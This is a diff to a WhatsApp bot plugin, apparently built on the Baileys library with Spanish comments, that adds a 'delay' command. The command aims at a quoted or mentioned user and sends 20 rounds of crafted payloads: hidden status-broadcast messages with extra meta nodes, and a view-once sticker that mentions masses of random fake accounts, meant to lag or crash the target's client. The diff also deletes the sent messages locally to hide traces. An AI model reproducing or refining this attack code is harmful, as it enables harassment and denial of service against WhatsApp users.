@@ -1,41 +1,43 @@
+
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
 let handler = async (m, { conn }) => {
-  const jid = m.chat;
+  // ✅ Evita enviártelo a ti mismo
+  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
+  if (jid === conn.user.id) {
+    return conn.sendMessage(m.chat, { text: '❌ No puedo enviármelo a mí mismo.' }, { quoted: m });
+  }
 
   try {
     for (let i = 0; i < 20; i++) {
-      await InVisibleX(conn, jid, true);
-      await xatanicaldelayv2(conn, jid, true);
-      await delay(10);
+      const m1 = await InVisibleX(conn, jid, true);
+      const m2 = await xatanicaldelayv2(conn, jid, true);
+
+      // ✅ Eliminar localmente para evitar cualquier rastro o carga en memoria
+      await conn.sendMessage(conn.user.id, { delete: m1.key });
+      await conn.sendMessage(conn.user.id, { delete: m2.key });
+
+      await delay(10); // ⏱️ Espera mínima para evitar rate-limit
     }
 
-    // ✅ MENSAJE FINAL - También invisible para el bot
-    const msg = await generateWAMessageFromContent(jid, {
-      extendedTextMessage: {
-        text: "✅ Delay enviado 200 veces.",
-        contextInfo: {},
-      }
-    }, { userJid: conn.user.id });
-
-    await conn.relayMessage(jid, msg.message, { messageId: msg.key.id });
+    await conn.sendMessage(m.chat, { text: "✅ Delay enviado 200 veces." }, { quoted: m });
 
   } catch (e) {
     console.error("❌ Error en delay:", e);
-    await conn.sendMessage(jid, { text: "❌ Error:\n" + e.message }, { quoted: m });
+    await conn.sendMessage(m.chat, { text: "❌ Error al ejecutar:\n" + e.message }, { quoted: m });
   }
 };
 
 handler.command = /^delay$/i;
 export default handler;
 
+// ⏱️ Delay útil para evitar sobrecarga
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// 📡 FUNCIONES OCULTAS
-
-async function InVisibleX(conn, jid, mention) {
+// 💥 Función 1
+async function InVisibleX(sock, jid, mention) {
   const msg = await generateWAMessageFromContent(jid, {
     buttonsMessage: {
       text: "🩸",
@@ -52,38 +54,57 @@ async function InVisibleX(conn, jid, mention) {
       ],
       headerType: 1,
     },
-  }, { userJid: conn.user.id });
+  }, {});
 
-  await conn.relayMessage("status@broadcast", msg.message, {
+  await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
+          },
+        ],
+      },
+    ],
   });
 
   if (mention) {
-    await conn.relayMessage(jid, {
+    await sock.relayMessage(jid, {
       groupStatusMentionMessage: {
-        message: {
-          protocolMessage: {
-            key: msg.key,
-            type: 25,
-          },
-        },
+        message: { protocolMessage: { key: msg.key, type: 25 } },
       },
-    }, {});
+    }, {
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: { is_status_mention: "hmmm" },
+          content: undefined,
+        },
+      ],
+    });
   }
+
+  return msg; // 🔁 Se retorna para eliminarlo después
 }
 
-async function xatanicaldelayv2(conn, jid, mention) {
+// 💥 Función 2
+async function xatanicaldelayv2(sock, jid, mention) {
   const message = {
     viewOnceMessage: {
       message: {
         stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4",
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
           fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
           fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
           mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
           mimetype: "image/webp",
-          directPath: "/v/t62.7161-24/...",
+          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
           fileLength: { low: 1, high: 0, unsigned: true },
           mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
           firstFrameLength: 19904,
@@ -96,18 +117,38 @@ async function xatanicaldelayv2(conn, jid, mention) {
                 "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
               ),
             ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
           },
+          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
         },
       },
     },
   };
 
-  const msg = await generateWAMessageFromContent(jid, message, {
-    userJid: conn.user.id,
-  });
-
-  await conn.relayMessage("status@broadcast", msg.message, {
+  const msg = generateWAMessageFromContent(jid, message, {});
+  await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [{ tag: "to", attrs: { jid: jid }, content: undefined }],
+          },
+        ],
+      },
+    ],
   });
+
+  return msg; // 🔁 Se retorna para eliminarlo después
 }
